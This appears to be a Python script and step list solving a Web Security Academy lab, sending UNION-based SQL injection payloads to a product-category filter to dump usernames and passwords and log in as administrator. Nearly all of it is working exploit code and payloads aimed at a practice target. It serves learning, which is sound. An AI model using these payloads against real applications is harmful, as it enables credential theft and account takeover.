#!/usr/bin/env python3

import requests, re

URL = 'https://0a0300a003b5c56e83dee7a100fe00d8.web-security-academy.net/filter'

def run():
    payload = "Glfts' union select null, username || ' : ' || password from users--"
    r = requests.get(URL, params={'category': payload})
    body = r.text
    print(f'[*] Payload: {payload}')
    print(f'[*] Status: {r.status_code}')

    if r.status_code == 500:
        print('[!] Error → SQL confirmed / bad syntax')

    if re.search(r'Congratulations|solved the lab', body):
        print('[✓] SOLVED')

    hint = re.findall(r'<p id="hint">(.*?)</p>', body)
    if hint:
        print(f'[*] Hint: {hint[0]}')

    items = re.findall(r'<t[hd]>(.*?)</t[hd]>', body)
    if items:
        print(f'[✓] Found {len(items)} list:')
        for item in items:
            clean = item.strip()
            if clean:
                print(f' → {clean}')

run()


"""
Steps to Reproduce

1. Open browser and access to this endpoint:`/filter?category=Gifts`
2. Determine sql injection by use this patload: `Gifts'--`.
3. Determine how may columns by use this patload: `Gifts' order by 2--` (Found 2 columns).
4. Determine which column are contain text by use this patload: `Glfts' union select null, 'hacked'--` (Second column is contain text).
5. Determine database version by use this payload: `Glfts' union select null, version() from users--`
6. Query `username` column from `users` table by use this payload: `Glfts' union select null, username from users--`.
7. Query `password` column from `users` table by use this payload: `Glfts' union select null, password from users--`.
8. Retrieves all usernames and passwords by concatenation columns use this payload: `Glfts' union select null, username || ' : ' || password from users--`.
9. Log in as the `administrator` user.
"""